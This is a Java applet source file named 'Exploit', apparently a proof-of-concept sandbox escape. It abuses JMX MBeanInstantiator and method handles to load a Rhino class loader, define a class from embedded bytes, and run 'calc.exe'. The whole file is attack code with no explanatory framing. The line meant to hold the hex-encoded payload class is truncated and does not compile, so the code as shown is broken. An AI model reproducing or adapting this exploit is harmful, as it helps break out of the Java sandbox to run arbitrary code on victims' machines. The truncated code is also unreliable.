package obfuscate;


public class Exploit extends java.applet.Applet {
    private static final long serialVersionUID = 1L;

    public static byte[] hex2Byte(java.lang.String inputString) {
        byte[] byteArray = new byte[(inputString.length()) / 2];
        for (int i = 0 ; i < (byteArray.length) ; i++) {
            byteArray[i] = ((byte)(java.lang.Integer.parseInt(inputString.substring((2 * i), ((2 * i) + 2)), 16)));
        }
        return byteArray;
    }

    public static byte[] classBBytes = obfuscate.Exploit.hex2Byte

    @java.lang.SuppressWarnings(value = "rawtypes")
    @java.lang.Override
    public void init() {
        try {
            java.lang.ClassLoader nullClassLoader = null;
            java.lang.Object[] noArgs = new java.lang.Object[]{  };
            java.lang.invoke.MethodHandles.Lookup lookup = java.lang.invoke.MethodHandles.publicLookup();
            com.sun.jmx.mbeanserver.MBeanInstantiator beanInstantiator = ((com.sun.jmx.mbeanserver.JmxMBeanServer)(new com.sun.jmx.mbeanserver.JmxMBeanServerBuilder().newMBeanServer("", null, null))).getMBeanInstantiator();
            java.lang.invoke.MethodType methodHandleClassStringMethodType = java.lang.invoke.MethodType.methodType(java.lang.invoke.MethodHandle.class, java.lang.Class.class, new java.lang.Class[]{ java.lang.String.class , java.lang.invoke.MethodType.class });
            java.lang.invoke.MethodHandle findVirtualMethodHandle = lookup.findVirtual(java.lang.invoke.MethodHandles.Lookup.class, "findVirtual", methodHandleClassStringMethodType);
            java.lang.invoke.MethodType methodHandleClassMethodType = java.lang.invoke.MethodType.methodType(java.lang.invoke.MethodHandle.class, java.lang.Class.class, new java.lang.Class[]{ java.lang.invoke.MethodType.class });
            java.lang.invoke.MethodHandle lookupFindConstructorMethodHandle = lookup.findVirtual(java.lang.invoke.MethodHandles.Lookup.class, "findConstructor", methodHandleClassMethodType);
            java.lang.Class generatedClassLoaderClass = beanInstantiator.findClass("sun.org.mozilla.javascript.internal.GeneratedClassLoader", nullClassLoader);
            java.lang.Class contextClass = beanInstantiator.findClass("sun.org.mozilla.javascript.internal.Context", nullClassLoader);
            java.lang.invoke.MethodType voidMethodType = java.lang.invoke.MethodType.methodType(java.lang.Void.TYPE);
            java.lang.invoke.MethodHandle contextContext = ((java.lang.invoke.MethodHandle)(lookupFindConstructorMethodHandle.invokeWithArguments(new java.lang.Object[]{ lookup , contextClass , voidMethodType })));
            java.lang.Object jsContext = contextContext.invokeWithArguments(noArgs);
            java.lang.invoke.MethodType generatedClassLoaderMethodType = java.lang.invoke.MethodType.methodType(generatedClassLoaderClass, java.lang.ClassLoader.class);
            java.lang.invoke.MethodHandle createClassLoaderMethodHandle = ((java.lang.invoke.MethodHandle)(findVirtualMethodHandle.invokeWithArguments(new java.lang.Object[]{ lookup , contextClass , "createClassLoader" , generatedClassLoaderMethodType })));
            java.lang.Object generatedClassLoader = createClassLoaderMethodHandle.invokeWithArguments(new java.lang.Object[]{ jsContext , null });
            java.lang.invoke.MethodType stringByteArrayMethodType = java.lang.invoke.MethodType.methodType(java.lang.Class.class, java.lang.String.class, new java.lang.Class[]{ byte[].class });
            java.lang.invoke.MethodHandle defineClassMethodHandle = ((java.lang.invoke.MethodHandle)(findVirtualMethodHandle.invokeWithArguments(new java.lang.Object[]{ lookup , generatedClassLoaderClass , "defineClass" , stringByteArrayMethodType })));
            java.lang.Class classBInstance = ((java.lang.Class)(defineClassMethodHandle.invokeWithArguments(new java.lang.Object[]{ generatedClassLoader , null , obfuscate.Exploit.classBBytes })));
            classBInstance.newInstance();
            java.lang.Runtime.getRuntime().exec("calc.exe");
        } catch (java.lang.Throwable e) {
            e.printStackTrace();
        }
    }
}

